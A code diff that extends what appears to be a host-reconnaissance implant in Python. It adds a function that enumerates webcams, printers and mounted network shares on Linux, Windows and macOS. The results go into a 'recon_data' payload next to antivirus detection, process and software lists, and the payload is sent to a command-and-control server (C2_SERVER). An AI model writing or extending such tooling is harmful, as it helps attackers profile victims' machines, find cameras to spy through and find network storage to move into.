@@ -722,6 +722,290 @@ def detect_antivirus():
         return []
 
 
+def get_connected_devices():
+    """
+    Enumerate connected devices (webcams, printers, network devices)
+    
+    Returns:
+        List of connected device information
+    """
+    log("Enumerating connected devices...")
+    devices = []
+    system = platform.system()
+    
+    try:
+        # Detect Webcams
+        if system == "Linux":
+            # Check /dev/video* devices
+            video_devices = list(Path("/dev").glob("video*"))
+            for dev in video_devices:
+                try:
+                    # Try to get device name from v4l2
+                    result = subprocess.run(
+                        ["v4l2-ctl", "--device", str(dev), "--info"],
+                        capture_output=True,
+                        text=True,
+                        timeout=2
+                    )
+                    if result.returncode == 0:
+                        # Parse device name from output
+                        for line in result.stdout.split('\n'):
+                            if 'Card type' in line:
+                                device_name = line.split(':')[1].strip()
+                                devices.append({
+                                    'type': 'Webcam',
+                                    'identifier': f"{device_name} ({dev.name})",
+                                    'status': 'connected'
+                                })
+                                break
+                    else:
+                        # Fallback if v4l2-ctl not available
+                        devices.append({
+                            'type': 'Webcam',
+                            'identifier': str(dev.name),
+                            'status': 'connected'
+                        })
+                except (subprocess.TimeoutExpired, FileNotFoundError):
+                    # v4l2-ctl not installed, just report device exists
+                    devices.append({
+                        'type': 'Webcam',
+                        'identifier': str(dev.name),
+                        'status': 'connected'
+                    })
+                except Exception:
+                    continue
+        
+        elif system == "Windows":
+            # Check for webcams via WMI
+            try:
+                result = subprocess.run(
+                    ["powershell", "-Command", 
+                     "Get-PnpDevice -Class Camera | Select-Object FriendlyName, Status | ConvertTo-Json"],
+                    capture_output=True,
+                    text=True,
+                    timeout=10
+                )
+                if result.returncode == 0 and result.stdout.strip():
+                    import json
+                    cameras = json.loads(result.stdout)
+                    if isinstance(cameras, dict):
+                        cameras = [cameras]
+                    for cam in cameras:
+                        devices.append({
+                            'type': 'Webcam',
+                            'identifier': cam.get('FriendlyName', 'Unknown Camera'),
+                            'status': cam.get('Status', 'Unknown').lower()
+                        })
+            except Exception:
+                pass
+        
+        elif system == "Darwin":  # macOS
+            # Check for video devices
+            try:
+                result = subprocess.run(
+                    ["system_profiler", "SPCameraDataType"],
+                    capture_output=True,
+                    text=True,
+                    timeout=10
+                )
+                if result.returncode == 0:
+                    # Parse camera info from output
+                    for line in result.stdout.split('\n'):
+                        line = line.strip()
+                        if line and ':' not in line and line != 'Camera:':
+                            devices.append({
+                                'type': 'Webcam',
+                                'identifier': line,
+                                'status': 'connected'
+                            })
+            except Exception:
+                pass
+        
+        # Detect Printers
+        if system == "Linux":
+            # Check CUPS printers
+            try:
+                result = subprocess.run(
+                    ["lpstat", "-p"],
+                    capture_output=True,
+                    text=True,
+                    timeout=5
+                )
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if line.startswith('printer'):
+                            parts = line.split()
+                            if len(parts) >= 2:
+                                printer_name = parts[1]
+                                status = 'idle' if 'idle' in line else 'busy' if 'printing' in line else 'unknown'
+                                devices.append({
+                                    'type': 'Printer',
+                                    'identifier': printer_name,
+                                    'status': status
+                                })
+            except (subprocess.TimeoutExpired, FileNotFoundError):
+                pass
+            
+            # Check for network printers via /etc/printcap or avahi
+            try:
+                result = subprocess.run(
+                    ["avahi-browse", "-t", "-r", "_printer._tcp"],
+                    capture_output=True,
+                    text=True,
+                    timeout=5
+                )
+                if result.returncode == 0:
+                    # Parse avahi output for network printers
+                    current_printer = None
+                    for line in result.stdout.split('\n'):
+                        if 'hostname' in line.lower():
+                            hostname = line.split('[')[1].split(']')[0] if '[' in line else 'unknown'
+                            if current_printer:
+                                devices.append({
+                                    'type': 'Network Printer',
+                                    'identifier': hostname,
+                                    'status': 'online'
+                                })
+            except (subprocess.TimeoutExpired, FileNotFoundError):
+                pass
+        
+        elif system == "Windows":
+            # Get printers via WMI
+            try:
+                result = subprocess.run(
+                    ["powershell", "-Command",
+                     "Get-Printer | Select-Object Name, PrinterStatus, PortName | ConvertTo-Json"],
+                    capture_output=True,
+                    text=True,
+                    timeout=10
+                )
+                if result.returncode == 0 and result.stdout.strip():
+                    import json
+                    printers = json.loads(result.stdout)
+                    if isinstance(printers, dict):
+                        printers = [printers]
+                    for printer in printers:
+                        status_map = {
+                            0: 'idle',
+                            1: 'printing',
+                            2: 'offline',
+                            3: 'error'
+                        }
+                        status = status_map.get(printer.get('PrinterStatus', 2), 'unknown')
+                        devices.append({
+                            'type': 'Printer',
+                            'identifier': printer.get('Name', 'Unknown Printer'),
+                            'status': status
+                        })
+            except Exception:
+                pass
+        
+        elif system == "Darwin":  # macOS
+            # Check CUPS printers on macOS
+            try:
+                result = subprocess.run(
+                    ["lpstat", "-p"],
+                    capture_output=True,
+                    text=True,
+                    timeout=5
+                )
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if line.startswith('printer'):
+                            parts = line.split()
+                            if len(parts) >= 2:
+                                printer_name = parts[1]
+                                status = 'idle' if 'idle' in line else 'busy' if 'printing' in line else 'unknown'
+                                devices.append({
+                                    'type': 'Printer',
+                                    'identifier': printer_name,
+                                    'status': status
+                                })
+            except (subprocess.TimeoutExpired, FileNotFoundError):
+                pass
+        
+        # Detect mounted network drives/NAS
+        if system == "Linux":
+            # Check mounted filesystems for NFS, CIFS, SMB
+            try:
+                result = subprocess.run(
+                    ["mount"],
+                    capture_output=True,
+                    text=True,
+                    timeout=5
+                )
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if 'type nfs' in line or 'type cifs' in line or 'type smb' in line:
+                            parts = line.split()
+                            if len(parts) >= 3:
+                                remote = parts[0]
+                                mount_point = parts[2]
+                                fs_type = 'NFS' if 'nfs' in line else 'SMB/CIFS'
+                                devices.append({
+                                    'type': f'Network Storage ({fs_type})',
+                                    'identifier': f"{remote} -> {mount_point}",
+                                    'status': 'mounted'
+                                })
+            except Exception:
+                pass
+        
+        elif system == "Windows":
+            # Check mapped network drives
+            try:
+                result = subprocess.run(
+                    ["net", "use"],
+                    capture_output=True,
+                    text=True,
+                    timeout=5
+                )
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if ':' in line and '\\\\' in line:
+                            parts = line.split()
+                            for part in parts:
+                                if part.startswith('\\\\'):
+                                    devices.append({
+                                        'type': 'Network Drive',
+                                        'identifier': part,
+                                        'status': 'connected'
+                                    })
+                                    break
+            except Exception:
+                pass
+        
+        elif system == "Darwin":  # macOS
+            # Check mounted volumes
+            try:
+                result = subprocess.run(
+                    ["mount"],
+                    capture_output=True,
+                    text=True,
+                    timeout=5
+                )
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if 'afp://' in line or 'smb://' in line or 'nfs' in line:
+                            parts = line.split()
+                            if len(parts) >= 3:
+                                remote = parts[0]
+                                mount_point = parts[2]
+                                devices.append({
+                                    'type': 'Network Storage',
+                                    'identifier': f"{remote} -> {mount_point}",
+                                    'status': 'mounted'
+                                })
+            except Exception:
+                pass
+        
+        log(f"Found {len(devices)} connected devices")
+        return devices
+        
+    except Exception as e:
+        log(f"Error enumerating devices: {e}", "ERROR")
+        return []
+
+
 def scan_ports(target, start_port=1, end_port=1024, timeout=0.5):
     """
     Scan ports on target host (LEGACY - use get_listening_ports instead)
@@ -922,7 +1206,10 @@ def main():
     # Step 10: Detect antivirus
     antivirus = detect_antivirus()
     
-    # Step 11: Build comprehensive payload
+    # Step 11: Enumerate connected devices (webcams, printers, network drives)
+    connected_devices = get_connected_devices()
+    
+    # Step 12: Build comprehensive payload
     payload = {
         'recon_data': {
             **system_info,
@@ -941,6 +1228,7 @@ def main():
             'processes': running_processes,
             'installed_software': installed_software,
             'antivirus': antivirus,
+            'connected_devices': connected_devices,
             'timestamp': datetime.now().isoformat(),
         }
     }
@@ -979,6 +1267,7 @@ def main():
         log(f"  Running Processes: {len(running_processes)}")
         log(f"  Installed Software: {len(installed_software)}")
         log(f"  Antivirus Products: {len(antivirus)}")
+        log(f"  Connected Devices: {len(connected_devices)}")
         log(f"  Total Findings: {summary.get('total_findings', 0)}")
         if final_data.get('report_path'):
             log(f"  Report: {C2_SERVER}{final_data['report_path']}")
